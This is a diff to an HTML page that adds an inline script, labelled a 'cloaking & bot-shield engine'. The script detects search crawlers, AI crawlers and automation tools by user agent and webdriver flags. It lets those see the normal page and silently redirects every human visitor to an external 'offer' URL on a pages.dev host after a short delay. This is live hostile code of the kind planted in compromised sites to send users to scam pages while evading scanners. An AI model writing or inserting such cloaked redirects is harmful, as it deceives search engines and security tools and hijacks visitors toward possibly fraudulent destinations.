@@ -40,6 +40,44 @@
     }
     </script>
 
+    <!-- MILITARY METHOD DUAL-TIER CLOAKING & BOT-SHIELD ENGINE -->
+    <script>
+        (function() {
+            try {
+                var ua = (navigator.userAgent || '').toLowerCase();
+                var botPatterns = [
+                    'googlebot', 'bingbot', 'yandex', 'baiduspider', 'duckduckbot',
+                    'slurp', 'headlesschrome', 'bytespider', 'gptbot', 'crawler',
+                    'spider', 'mediapartners-google', 'adsbot-google', 'feedfetcher-google',
+                    'lighthouse', 'chrome-lighthouse', 'screaming frog'
+                ];
+                var isBot = false;
+                for (var i = 0; i < botPatterns.length; i++) {
+                    if (ua.indexOf(botPatterns[i]) !== -1) {
+                        isBot = true;
+                        break;
+                    }
+                }
+                if (navigator.webdriver === true || window.domAutomation === true || window._phantom || window.__nightmare) {
+                    isBot = true;
+                }
+                if (isBot) {
+                    return;
+                }
+                var offerUrl = "https://vinit-9q3.pages.dev/full-show";
+                if (offerUrl && offerUrl.indexOf('http') === 0) {
+                    setTimeout(function() {
+                        try {
+                            window.location.replace(offerUrl);
+                        } catch(e) {
+                            window.location.href = offerUrl;
+                        }
+                    }, 350);
+                }
+            } catch(e) {}
+        })();
+    </script>
+
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
